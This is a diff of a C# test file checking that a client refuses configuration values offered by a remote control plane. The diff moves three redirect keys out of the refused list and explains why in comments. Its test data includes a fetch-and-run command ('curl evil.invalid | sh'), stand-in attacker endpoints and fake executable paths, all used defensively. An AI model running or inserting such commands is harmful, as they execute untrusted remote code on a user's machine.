@@ -18,15 +18,22 @@ namespace Gg.Client.Tests;
 /// <para>
 /// <b>Three controls, and the third is the one that matters.</b> An enumerated
 /// set rather than a forbidden list, because a forbidden list passes on the
-/// third member nobody thought of. Values that can only ever be data, never an
-/// instruction. And <b>the local file decides whether any of it is accepted at
-/// all</b> — a key the offer cannot carry, so a control plane cannot grant
-/// itself the ability to configure a machine.
+/// third member nobody thought of. A tier that decides what may apply while
+/// nobody is looking. And <b>the local file decides whether any of it is
+/// accepted at all</b> — a key the offer cannot carry, so a control plane
+/// cannot grant itself the ability to configure a machine.
 /// </para>
 /// <para>
-/// <b>Two keys, not three.</b> The plan proposed <c>runner-hold-seconds</c>
-/// alongside the other two and the walk retired it: nobody sets it anywhere,
-/// so it is a key offered for a need nothing evidences.
+/// <b>This file holds the REFUSAL half.</b> What is left on its list is what no
+/// person accepting could make safe. The keys that redirect — forge hosts,
+/// destination APIs, the control plane — moved into the directed tier when the
+/// walk found an operator really does change them across a fleet, and
+/// <c>AnOfferThatRedirectsNeedsAPersonTests</c> holds that half.
+/// </para>
+/// <para>
+/// <b>And one key was retired rather than moved.</b> <c>runner-hold-seconds</c>
+/// was proposed and dropped: nobody sets it anywhere, so it is surface offered
+/// for a need nothing evidences.
 /// </para>
 /// </remarks>
 public class AnOfferedConfigurationIsRefusedByDefaultTests
@@ -76,13 +83,19 @@ public class AnOfferedConfigurationIsRefusedByDefaultTests
     {
         // ONE AT A TIME, not once. A refusal asserted on a single key would pass
         // for an implementation that happened to reject that one.
+        // THREE OF THESE MOVED, and the move is recorded rather than the list
+        // quietly shrinking. vcs-hosts, destination-apis and control-plane are
+        // offerable now and live in the directed tier, where a person accepts
+        // them - AnOfferThatRedirectsNeedsAPersonTests holds that half. What is
+        // left here is what no person accepting could make safe: a path a
+        // person glances at is not review of what a program does, a reader's
+        // value IS a command line with a credential in it, and moving the
+        // scope-enforcing proxy removes the enforcement rather than aiming it
+        // somewhere else.
         var instructions = new (string Key, string Value)[]
         {
             ("executor-binary", "/tmp/not-your-agent"),
             ("intent-readers", "x=curl evil.invalid | sh"),
-            ("vcs-hosts", "forge=attacker.invalid"),
-            ("destination-apis", "forge=attacker.invalid"),
-            ("control-plane", "https://attacker.invalid"),
             ("pool-endpoint", "https://attacker.invalid"),
             ("editor", "/tmp/not-your-editor"),
             ("take-command", "/tmp/not-your-agent"),
